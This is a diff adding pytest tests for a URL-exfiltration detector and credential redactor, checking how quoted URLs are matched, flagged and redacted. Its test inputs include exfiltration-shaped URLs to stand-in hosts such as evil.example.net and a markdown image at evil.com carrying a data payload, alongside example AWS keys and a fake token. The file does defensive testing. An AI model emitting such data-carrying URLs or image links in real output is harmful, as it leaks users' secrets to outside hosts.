@@ -12,6 +12,7 @@ point, and the attacker-writable-meta carve-out.
 from __future__ import annotations
 
 import json
+import re
 
 import pytest
 
@@ -25,9 +26,11 @@ from kiro_crew.dashboard.chat_utils import (
 from kiro_crew.security import (
     bounded_blocked_links,
     exfil,
+    hard_credential_hit,
     redact_credentials,
     redact_exfiltration_urls,
     redact_exfiltration_urls_with_records,
+    scan_exfiltration_urls,
 )
 from kiro_crew.security.exfil import _exfil_url_warning, revalidate_blocked_link
 
@@ -1213,3 +1216,353 @@ class TestAVariantsRecordsAreCheckedOnServe:
         out = _prepare_messages(msgs, False, live_child="")
 
         assert out[0]["variants"][0]["blocked_links"] == records
+
+
+class TestEnclosingQuoteSurvivesRedaction:
+    """The URL path class admits ``'`` so a URL-internal apostrophe is read (the
+    round-37 ``]'<token>`` shape stays one scanned URL), but a ``'`` before a
+    delimiter or the text's end is the closing quote of a single-quoted scalar,
+    string or attribute and ends the match. Admitting it unconditionally made a
+    redaction eat the closing quote (invalid YAML/JS), merged a two-URL list into
+    one URL judged under the first (exempt) host so the second URL's payload
+    shipped, and glued the quote onto a presigned signature so a valid URL was
+    wrongly redacted. The class now ends at the closing quote, matching the base,
+    while the bracket-token URL is still blocked."""
+
+    def test_a_single_quoted_yaml_scalar_keeps_its_closing_quote(self) -> None:
+        url = f"https://{_DOMAIN}/?token={_LONG_QUERY_TAIL}"
+        cleaned, warnings = redact_exfiltration_urls(f"url: '{url}'")
+
+        assert warnings
+        assert cleaned == f"url: '{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}{_DOMAIN}]'"
+        assert cleaned.count("'") % 2 == 0
+
+    def test_a_single_quoted_js_string_keeps_its_closing_quote(self) -> None:
+        url = f"https://{_DOMAIN}/?token={_LONG_QUERY_TAIL}"
+        cleaned, warnings = redact_exfiltration_urls(f"const u = '{url}';")
+
+        assert warnings
+        assert cleaned == f"const u = '{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}{_DOMAIN}]';"
+
+    def test_a_single_quoted_scalar_keeps_the_sibling_after_it(self) -> None:
+        url = f"https://{_DOMAIN}/?token={_LONG_QUERY_TAIL}"
+        cleaned, warnings = redact_exfiltration_urls(f"- '{url}'\n- next: 1")
+
+        assert warnings
+        assert cleaned == f"- '{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}{_DOMAIN}]'\n- next: 1"
+
+    def test_a_quoted_list_does_not_merge_the_second_url_under_the_first_host(self) -> None:
+        # The closing quote of the first list item ends its URL, so the second,
+        # evil URL is judged on its OWN host instead of being swallowed into the
+        # first (exempt) one and skipping the heuristics -- a security regression.
+        # Asserted on the records' domain field with ==, not a substring test on
+        # the warning text (which CodeQL reads as a URL sanitizer).
+        evil = f"https://evil.example.net/?d={_LONG_QUERY_TAIL}"
+        text = f"['https://{_DOMAIN}/a','{evil}']"
+        cleaned, warnings, records = redact_exfiltration_urls_with_records(
+            text, extra_exempt_hosts=frozenset({_DOMAIN})
+        )
+
+        assert [r["domain"] for r in records] == ["evil.example.net"]
+        assert _LONG_QUERY_TAIL not in cleaned
+
+    def test_a_compact_quoted_list_redacts_both_suspicious_urls(self) -> None:
+        # Both items are suspicious. The match ends at the first closing quote,
+        # so each URL is its own match, judged and replaced; a span that spanned
+        # both replaced only the first and left the second (token included)
+        # readable, which the per-URL loop never rescanned.
+        a = f"https://a.example/?d={_LONG_QUERY_TAIL}"
+        b = f"https://b.example/?e={_LONG_QUERY_TAIL}X"
+        cleaned, warnings = redact_exfiltration_urls(f"['{a}','{b}']")
+
+        assert len(warnings) >= 2, warnings
+        assert cleaned == (
+            f"['{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}a.example]'"
+            f",'{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}b.example]']"
+        )
+
+    def test_a_single_quoted_presigned_shaped_url_excludes_the_enclosing_quote(self) -> None:
+        # The presigned false positive was the enclosing ' glued onto the last
+        # param (X-Amz-Signature), which failed the presigned fast-path and
+        # redacted a valid URL. The match now ends at the closing quote, so the
+        # last param value is intact. Asserted at the _URL_RE boundary with a
+        # non-credential signature so no AWS key id is committed (the end-to-end
+        # _is_safe_presigned path is exercised by the probe, which cannot be
+        # pinned here without a real AKIA/ASIA id the content and secret scanners
+        # flag).
+        sig = "a" * 64
+        url = f"https://b.s3.amazonaws.com/f.csv?X-Amz-Signature={sig}"
+        match = exfil._URL_RE.search(f"requests.get('{url}')")
+
+        assert match is not None
+        assert match.group(0) == url
+
+    def test_a_single_quoted_presigned_s3_url_is_left_intact(self) -> None:
+        # End-to-end: a valid single-quoted presigned URL validates and is NOT
+        # redacted, because the match ends at the closing quote, so
+        # X-Amz-Signature validates and the URL stays intact. Uses the AWS
+        # documentation example key id, which the content scan and Semgrep
+        # allowlist and which the presigned fast-path accepts (AKIA prefix).
+        url = (
+            "https://my-bucket.s3.us-east-1.amazonaws.com/results/abc.csv"
+            "?X-Amz-Algorithm=AWS4-HMAC-SHA256"
+            "&X-Amz-Credential=AKIAIOSFODNN7EXAMPLE%2F20260430%2Fus-east-1%2Fs3%2Faws4_request"
+            "&X-Amz-Date=20260430T150000Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host"
+            "&X-Amz-Signature="
+            "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"
+        )
+        cleaned, warnings = redact_exfiltration_urls(f"requests.get('{url}')")
+
+        assert not warnings
+        assert "[REDACTED" not in cleaned
+        assert cleaned == f"requests.get('{url}')"
+
+    def test_a_quoted_concatenation_of_two_urls_is_two_matches(self) -> None:
+        # `'<url-a>'+'<url-b>'` is a string concatenation of two URLs, not one.
+        # `+` is not a value byte, but the ' before it was admitted because `+`
+        # is not a delimiter, so the match ran through `'+'` into url-b and
+        # judged it under url-a's host. The :// guard ends url-a's match at its
+        # closing quote, so each URL is its own match and judged on its own host.
+        a = f"https://a.example/x?d={_LONG_QUERY_TAIL}"
+        b = f"https://b.example/c?d={_LONG_QUERY_TAIL}"
+        cleaned, warnings, records = redact_exfiltration_urls_with_records(
+            f"x = '{a}'+'{b}';", extra_exempt_hosts=frozenset({"a.example"})
+        )
+
+        # a.example is exempt and keeps its query; the fix is that b.example is
+        # judged on its OWN host (one record) instead of merged under a's.
+        assert [r["domain"] for r in records] == ["b.example"]
+
+    def test_a_quoted_url_ending_in_a_separator_keeps_the_next_url_separate(self) -> None:
+        # `'<url-a>?q='+'<url-b>'` and the `,` form: url-a's closing quote sits
+        # right after `=`, a value opener, but a `+` then a quote (or a `,`)
+        # follows, which is a concatenation, not a value byte, so the quote ends
+        # url-a's match and url-b is judged on its own host even when url-a's is
+        # exempt. A credential value byte after the quote (or after a `+`) still
+        # reads as the same URL, which the slash/plus pin covers.
+        a = "https://a.example/search?q="
+        b = f"https://b.example/c?d={_LONG_QUERY_TAIL}"
+        for joiner in ("+", ","):
+            _cleaned, _warnings, records = redact_exfiltration_urls_with_records(
+                f"x = '{a}'{joiner}'{b}';", extra_exempt_hosts=frozenset({"a.example"})
+            )
+            assert [r["domain"] for r in records] == ["b.example"], joiner
+
+    def test_two_quoted_urls_joined_by_a_word_are_judged_on_their_own_hosts(self) -> None:
+        # `'<url-a>?q='and'<url-b>'`: url-a's closing quote sits right after `=`
+        # and a letter follows it, which reads as a value byte, but the quote
+        # before url-b is followed by a URL SCHEME, which no URL value carries
+        # unquoted, so that quote ends the match. url-b is then a match of its
+        # own, judged on its own host even when url-a's is exempt, in a bare
+        # line and inside a double-quoted string alike; the scan warns on it.
+        a = "https://a.example/search?q="
+        b = f"https://b.example/c?d={_LONG_QUERY_TAIL}"
+        for text in (f"'{a}'and'{b}'", f"x = \"'{a}'or'{b}'\"", f"'{a}'{b}'"):
+            _cleaned, _warnings, records = redact_exfiltration_urls_with_records(
+                text, extra_exempt_hosts=frozenset({"a.example"})
+            )
+            assert [r["domain"] for r in records] == ["b.example"], text
+            assert _LONG_QUERY_TAIL not in _cleaned, text
+            assert scan_exfiltration_urls(text), text
+
+    def test_a_non_http_scheme_separator_inside_a_query_stays_in_that_query(self) -> None:
+        # `?d=://<payload>`, `?d=ftp://<payload>`, `?x=a://AKIA...`: a `://` that no
+        # `http`/`https` word precedes is a byte of the URL's own query, not the
+        # start of a second URL the class could match, so the bytes after it are
+        # scanned with the URL and the payload is flagged and redacted, as on the
+        # base. Only a second `http(s)://` bounds a match.
+        for tail in (
+            f"://{_LONG_QUERY_TAIL}",
+            f"ftp://{_LONG_QUERY_TAIL}",
+            "a://AKIAIOSFODNN7EXAMPLE",
+            "ftp://ghp%5F" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8",
+        ):
+            url = f"https://{_DOMAIN}/c?d={tail}"
+            assert scan_exfiltration_urls(url), url
+            cleaned, warnings, records = redact_exfiltration_urls_with_records(url)
+            assert warnings and [r["domain"] for r in records] == [_DOMAIN], url
+            assert _LONG_QUERY_TAIL not in cleaned and "AKIAIOSFODNN7EXAMPLE" not in cleaned, url
+            assert "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8" not in cleaned, url
+
+    def test_semicolon_separated_quoted_urls_are_separate_matches(self) -> None:
+        a = f"https://a.example/x?d={_LONG_QUERY_TAIL}"
+        b = f"https://b.example/c?d={_LONG_QUERY_TAIL}"
+        cleaned, warnings = redact_exfiltration_urls(f"'{a}';'{b}'")
+
+        assert len(warnings) >= 2, warnings
+        assert cleaned == (
+            f"'{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}a.example]'"
+            f";'{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}b.example]'"
+        )
+
+    def test_an_html_attribute_url_keeps_its_closing_quote_and_markup(self) -> None:
+        # A `'` before `>` is a URL byte to neither class, so the match ends at
+        # the attribute's closing quote and the markup after it stays.
+        url = f"https://{_DOMAIN}/?token={_LONG_QUERY_TAIL}"
+        cleaned, warnings = redact_exfiltration_urls(f"<a href='{url}'>x</a>")
+
+        assert warnings
+        assert cleaned == (f"<a href='{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}{_DOMAIN}]'>x</a>")
+
+    def test_a_js_string_url_keeps_its_closing_quote_and_trailing_call(self) -> None:
+        # A `'` before `.` ends the match, so the string's closing quote and the
+        # `.trim()` call after it stay.
+        url = f"https://{_DOMAIN}/?token={_LONG_QUERY_TAIL}"
+        cleaned, warnings = redact_exfiltration_urls(f"u='{url}'.trim()")
+
+        assert warnings
+        assert cleaned == (f"u='{exfil.EXFILTRATION_REDACTION_TAG_PREFIX}{_DOMAIN}]'.trim()")
+
+    def test_a_slash_or_plus_opened_value_after_a_bare_close_is_scanned(self) -> None:
+        # The URL match ends at the quote, as the base's does, and the hard floor
+        # reads `aws_secret_access_key=]` as a labelled value, as the base does:
+        # the scan warns and the vetting path blocks, whatever byte follows the
+        # quote (`/` and `+` included). The bytes after the quote are the
+        # credential pass's to mask (`redact_credentials` reads `]'<secret>` as
+        # the value), not this pass's.
+        secret = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+        for head in ("/", "+"):
+            url = f"https://{_DOMAIN}/x?aws_secret_access_key=]'{head}{secret}"
+            cleaned, warnings = redact_exfiltration_urls(url)
+
+            assert scan_exfiltration_urls(url), head
+            assert warnings, head
+            assert cleaned.startswith(exfil.EXFILTRATION_REDACTION_TAG_PREFIX), head
+
+
+class TestTheUrlFloorReadsAsTheBaseDoes:
+    """The exfil URL floor uses the base's URL grammar and its coarse labelled
+    branches, plus ONE exemption for a value that is a run of the redactor's own
+    tags. Everything else the URL floor says, the base says."""
+
+    # The base's URL class and labelled branches, as literal copies: the oracle
+    # these tests hold the floor to. They are not imported from the product so
+    # a product change cannot move the oracle with it.
+    _BASE_URL_RE = re.compile(
+        r"https?://("
+        r"[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}"
+        r"|\d{1,3}(?:\.\d{1,3}){3}"
+        r"|\[[0-9A-Fa-f:.]+\]"
+        r")(:\d+)?([/?][^\s)\"'>]*)?"
+    )
+    _BASE_LABELLED_RE = re.compile(
+        r'(?:SecretAccessKey|aws_secret_access_key)["\']?\s*[:=]\s*["\']?[^\s"\',}]+'
+        r'|(?:SessionToken|aws_session_token)["\']?\s*[:=]\s*["\']?[^\s"\',}]+'
+        r'|(?:AccessKeyId|aws_access_key_id)["\']?\s*[:=]\s*["\']?[^\s"\',}]+',
+        re.IGNORECASE,
+    )
+    _SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+    _ROUND_INPUTS = (
+        # a quoted value opening with a path or base64 byte
+        f"https://{_DOMAIN}/x?aws_secret_access_key=]'/{_SECRET}",
+        f"https://{_DOMAIN}/x?aws_secret_access_key=]'+{_SECRET}",
+        # two quoted URLs joined by a separator
+        f"x = 'https://a.example/search?q=','https://b.example/c?d={_LONG_QUERY_TAIL}';",
+        f"x = 'https://a.example/search?q='+'https://b.example/c?d={_LONG_QUERY_TAIL}';",
+        # two quoted URLs joined by a word, bare and inside a string
+        f"'https://a.example/x?q='and'https://b.example/?data={_LONG_QUERY_TAIL}'",
+        f"x = \"'https://a.example/x?q='or'https://b.example/?data={_LONG_QUERY_TAIL}'\"",
+        # a separator no http word precedes, inside a query
+        f"https://{_DOMAIN}/c?d=://{_LONG_QUERY_TAIL}",
+        f"https://{_DOMAIN}/c?d=ftp://{_LONG_QUERY_TAIL}",
+        f"https://{_DOMAIN}/c?x=a://AKIAIOSFODNN7EXAMPLE",
+        # a nested URL as a labelled value, a nested http query value
+        f"https://a.example/x?Session%54oken=https://b.example/?d={_LONG_QUERY_TAIL}",
+        f"![a](https://evil.com/i.png?q=http://{_LONG_QUERY_TAIL})",
+        # a URL ending inside a quoted scalar, attribute or call
+        f"url: 'https://{_DOMAIN}/?token={_LONG_QUERY_TAIL}'",
+        f"<a href='https://{_DOMAIN}/?token={_LONG_QUERY_TAIL}'>x</a>",
+        f"u='https://{_DOMAIN}/?token={_LONG_QUERY_TAIL}'.trim()",
+    )
+
+    def test_a_nested_url_as_a_labelled_value_is_flagged_and_redacted(self) -> None:
+        # The labelled key is percent-encoded and its value is a second URL. The outer URL is ONE match to the host's end of the line, as
+        # on the base, so the decoded query carries `SessionToken=https://...`
+        # and the hard floor flags it; the whole outer URL is redacted.
+        url = f"https://a.example/x?Session%54oken=https://b.example/?d={_LONG_QUERY_TAIL}"
+        assert scan_exfiltration_urls(url), url
+        cleaned, warnings, records = redact_exfiltration_urls_with_records(url)
+        assert warnings and [r["domain"] for r in records] == ["a.example"], url
+        assert _LONG_QUERY_TAIL not in cleaned and "b.example" not in cleaned, cleaned
+
+    def test_a_markdown_image_with_a_nested_http_query_value_is_flagged(self) -> None:
+        # The image URL's query value begins with `http://`. The match runs to
+        # the `)` as on the base, the long base64 query is read
+        # whole and flagged, and the URL is redacted inside the markdown.
+        text = f"![a](https://evil.com/i.png?q=http://{_LONG_QUERY_TAIL})"
+        assert scan_exfiltration_urls(text), text
+        cleaned, warnings, records = redact_exfiltration_urls_with_records(text)
+        assert warnings and [r["domain"] for r in records] == ["evil.com"], text
+        assert _LONG_QUERY_TAIL not in cleaned, cleaned
+        assert cleaned.startswith("![a](") and cleaned.endswith(")"), cleaned
+
+    def test_the_url_class_reads_the_round_inputs_as_the_base_does(self) -> None:
+        # Every URL span the product's class finds in the round inputs is the
+        # span the base's class finds: no quote branch, no iterator, no split.
+        for text in self._ROUND_INPUTS:
+            ours = [(m.span(), m.group(1), m.group(3) or "") for m in exfil._URL_RE.finditer(text)]
+            base = [
+                (m.span(), m.group(1), m.group(3) or "") for m in self._BASE_URL_RE.finditer(text)
+            ]
+            assert ours == base, text
+
+    def test_the_hard_floor_reads_the_round_inputs_as_the_base_does(self) -> None:
+        # On every path and query of the round inputs, raw and percent-decoded,
+        # the product's floor answers exactly as the base does: its labelled
+        # branches plus the AWS key-id marker (the shared spelling), which one
+        # input carries; the SSH, PEM and Slack markers are the base's own and
+        # the inputs carry none.
+        from urllib.parse import unquote
+
+        from kiro_crew.credential_patterns import AWS_KEY_ID
+
+        base_floor = re.compile(f"{AWS_KEY_ID}|{self._BASE_LABELLED_RE.pattern}", re.IGNORECASE)
+        for text in self._ROUND_INPUTS:
+            for match in self._BASE_URL_RE.finditer(text):
+                for payload in (match.group(3) or "", unquote(match.group(3) or "")):
+                    assert hard_credential_hit(payload) is (
+                        base_floor.search(payload) is not None
+                    ), (text, payload)
+
+    def test_the_one_divergence_from_the_base_is_a_tag_filled_value(self) -> None:
+        # The redactor keeps the key and replaces the value, so its own output
+        # `aws_secret_access_key=[REDACTED: credential]` is cleaned text. The base
+        # reads it as a live labelled value; this floor does not, and ONLY when
+        # the value is a run of registered tags followed by a boundary: another
+        # case, glued bytes or a value byte after the tag are live to both.
+        tag = "[REDACTED: credential]"
+        for clean in (
+            f"aws_secret_access_key={tag}",
+            f"aws_secret_access_key={tag}&next=1",
+            f'"aws_secret_access_key": "{tag}"',
+            f"SessionToken={tag}{tag}",
+            f"aws_session_token={tag} and more",
+        ):
+            assert self._BASE_LABELLED_RE.search(clean) is not None, clean
+            assert hard_credential_hit(clean) is False, clean
+        for live in (
+            f"aws_secret_access_key={tag}{self._SECRET}",
+            "aws_secret_access_key=[redacted: credential]",
+            f"aws_secret_access_key={tag[:-1]}",
+            f"aws_session_token={tag}\\n{self._SECRET}",
+            f"SessionToken={tag},{self._SECRET[:24]}",
+            f"aws_secret_access_key={tag}}}x",
+        ):
+            assert self._BASE_LABELLED_RE.search(live) is not None, live
+            assert hard_credential_hit(live) is True, live
+
+    def test_a_tag_with_a_comma_glued_token_in_a_query_is_flagged_as_on_the_base(self) -> None:
+        # In a URL query a bare value runs to `&`, so a `,` after a tag run is not
+        # where a value ends: `SessionToken=[REDACTED: credential],<token>` is a
+        # labelled value to this floor as the base's floor reads it (the tag as the
+        # value), and the URL is flagged and redacted; with the label's `T`
+        # percent-encoded the raw query names no label and the decoded one must.
+        token = "AbCdEfGhIjKlMnOpQrStUvWx"
+        url = f"https://{_DOMAIN}/x?Session%54oken=[REDACTED:%20credential],{token}"
+        decoded = f"SessionToken=[REDACTED: credential],{token}"
+        assert self._BASE_LABELLED_RE.search(decoded) is not None, decoded
+        assert hard_credential_hit(decoded) is True, decoded
+        assert scan_exfiltration_urls(url), url
+        cleaned, warnings, records = redact_exfiltration_urls_with_records(url)
+        assert warnings and [r["domain"] for r in records] == [_DOMAIN], url
+        assert token not in cleaned, cleaned
